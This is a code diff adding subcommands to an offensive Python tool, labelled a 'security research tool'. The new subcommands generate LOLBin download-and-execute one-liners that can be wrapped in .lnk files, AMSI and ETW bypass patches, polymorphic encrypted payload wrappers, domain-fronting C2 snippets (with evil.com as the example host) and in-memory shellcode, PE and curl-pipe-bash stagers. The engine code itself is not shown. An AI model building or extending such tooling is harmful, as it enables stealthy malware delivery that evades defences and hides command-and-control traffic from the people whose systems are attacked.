@@ -14,6 +14,11 @@ from archive_handler import ArchiveHandler
 from encryption_engine import EncryptionEngine
 from evasion_engine import EvasionEngine
 from macro_engine import MacroEngine
+from lolbin_engine import LOLBinEngine
+from patch_engine import PatchEngine
+from poly_engine import PolyEngine
+from front_engine import FrontEngine
+from loader_engine import LoaderEngine
 
 def main():
     parser = argparse.ArgumentParser(description="Hider: EXIF Metadata Security Research Tool")
@@ -142,6 +147,42 @@ def main():
     lnk_parser.add_argument("--cmd", required=True, help="Command to execute")
     lnk_parser.add_argument("--out", required=True, help="Output .lnk path")
     lnk_parser.add_argument("--icon", help="Icon path (optional)")
+
+    # LOLBin Chain Generator
+    lolbin_parser = subparsers.add_parser("lolbin", help="Generate LOLBin payload chains (mshta/rundll32/certutil)")
+    lolbin_parser.add_argument("--type", choices=["mshta", "mshta-inline", "rundll32", "certutil", "regsvr32", "msiexec", "ps-cradle"], required=True)
+    lolbin_parser.add_argument("--url", help="C2 URL / payload URL", required=True)
+    lolbin_parser.add_argument("--payload", help="Inline payload command (for mshta-inline)")
+    lolbin_parser.add_argument("--lnk", help="Also wrap command in .lnk file at this path")
+    lolbin_parser.add_argument("--out", help="Output file for the generated one-liner")
+
+    # ETW/AMSI Patch Generator
+    patch_parser = subparsers.add_parser("patch", help="Generate ETW/AMSI PowerShell Patch Snippets")
+    patch_parser.add_argument("--target", choices=["amsi", "etw", "all"], default="all", help="What to patch")
+    patch_parser.add_argument("--obfuscate", action="store_true", help="Base64 encode the output")
+    patch_parser.add_argument("--out", help="Output file (.ps1 or .txt)", required=True)
+
+    # Polymorphic Payload Wrapper
+    poly_parser = subparsers.add_parser("poly", help="Wrap a payload with unique AES encryption each run")
+    poly_parser.add_argument("--payload", help="Inline payload string")
+    poly_parser.add_argument("--file", help="Input payload file")
+    poly_parser.add_argument("--layers", type=int, default=1, help="Number of encryption layers")
+    poly_parser.add_argument("--out", help="Output .ps1 file", required=True)
+
+    # Domain Fronting Generator
+    front_parser = subparsers.add_parser("front", help="Generate Domain Fronting payloads (CDN abuse)")
+    front_parser.add_argument("--real", required=True, help="Real C2 host (e.g. evil.com)")
+    front_parser.add_argument("--front", required=True, help="CDN fronting host (e.g. d123.cloudfront.net)")
+    front_parser.add_argument("--path", default="/", help="URL path (e.g. /beacon.ps1)")
+    front_parser.add_argument("--out", help="Output file", required=True)
+
+    # Reflective Loader Stager
+    loader_parser = subparsers.add_parser("loader", help="Generate Reflective In-Memory Stagers")
+    loader_parser.add_argument("--url", required=True, help="URL to download shellcode/PE from")
+    loader_parser.add_argument("--platform", choices=["windows", "linux", "both"], default="windows")
+    loader_parser.add_argument("--type", choices=["shellcode", "pe", "all"], default="shellcode", help="Stager type")
+    loader_parser.add_argument("--obfuscate", action="store_true", help="Base64-encode PS output")
+    loader_parser.add_argument("--out", help="Output file", required=True)
 
     args = parser.parse_args()
 
@@ -501,6 +542,88 @@ def main():
                 sleep_ms=args.sleep
             )
             print(f"Successfully generated VBA macro: {args.out}")
+
+        elif args.command == "lolbin":
+            lolbin_type = args.type
+            url = args.url
+            if lolbin_type == "mshta":
+                cmd = LOLBinEngine.mshta(url)
+            elif lolbin_type == "mshta-inline":
+                cmd = LOLBinEngine.mshta_inline(args.payload or url)
+            elif lolbin_type == "rundll32":
+                cmd = LOLBinEngine.rundll32_js(url)
+            elif lolbin_type == "certutil":
+                cmd = LOLBinEngine.certutil_stager(url)
+            elif lolbin_type == "regsvr32":
+                cmd = LOLBinEngine.regsvr32_scrobj(url)
+            elif lolbin_type == "msiexec":
+                cmd = LOLBinEngine.msiexec_remote(url)
+            else:  # ps-cradle
+                cmd = LOLBinEngine.ps_download_exec(url)
+
+            print(f"\n[{lolbin_type.upper()} ONE-LINER]\n{cmd}\n")
+
+            if args.lnk:
+                LNKHandler.create_lnk_payload(cmd, args.lnk)
+                print(f"LNK written: {args.lnk}")
+
+            if args.out:
+                with open(args.out, "w") as f:
+                    f.write(cmd)
+                print(f"Saved: {args.out}")
+
+        elif args.command == "patch":
+            target = args.target
+            obfuscate = args.obfuscate
+            if target == "amsi":
+                result = PatchEngine.amsi_patch(obfuscate)
+            elif target == "etw":
+                result = PatchEngine.etw_patch(obfuscate)
+            else:
+                result = PatchEngine.all_patches(obfuscate)
+            with open(args.out, "w") as f:
+                f.write(result)
+            print(f"Successfully generated {target.upper()} patch snippet: {args.out}")
+
+        elif args.command == "poly":
+            if args.file:
+                PolyEngine.wrap_file(args.file, args.out, layers=args.layers)
+            elif args.payload:
+                stub = PolyEngine.wrap_powershell(args.payload, layers=args.layers)
+                with open(args.out, "w") as f:
+                    f.write(stub)
+            else:
+                print("Error: --payload or --file required for poly command")
+                sys.exit(1)
+            print(f"Successfully generated polymorphic wrapper: {args.out}")
+
+        elif args.command == "front":
+            snippets = FrontEngine.generate_all(args.real, args.front, args.path)
+            output = "\n\n".join([f"# {k}\n{v}" for k, v in snippets.items()])
+            with open(args.out, "w") as f:
+                f.write(output)
+            print(f"Successfully generated domain fronting snippets: {args.out}")
+            print(f"\n[CURL]\n{snippets['curl']}\n")
+
+        elif args.command == "loader":
+            loader_type = args.type
+            platform = args.platform
+            obfuscate = args.obfuscate
+            output_parts = []
+
+            if platform in ("windows", "both"):
+                if loader_type in ("shellcode", "all"):
+                    output_parts.append("# Windows Shellcode Stager\n" + LoaderEngine.ps_shellcode_stager(args.url, obfuscate))
+                if loader_type in ("pe", "all"):
+                    output_parts.append("# Windows PE / .NET Assembly Stager\n" + LoaderEngine.ps_pe_stager(args.url, obfuscate))
+            if platform in ("linux", "both"):
+                output_parts.append("# Linux memfd Stager\n" + LoaderEngine.bash_memfd_stager(args.url))
+                output_parts.append("# Linux curl | bash\n" + LoaderEngine.bash_curl_exec(args.url))
+
+            result = "\n\n".join(output_parts)
+            with open(args.out, "w") as f:
+                f.write(result)
+            print(f"Successfully generated loader stager: {args.out}")
 
         else:
             parser.print_help()
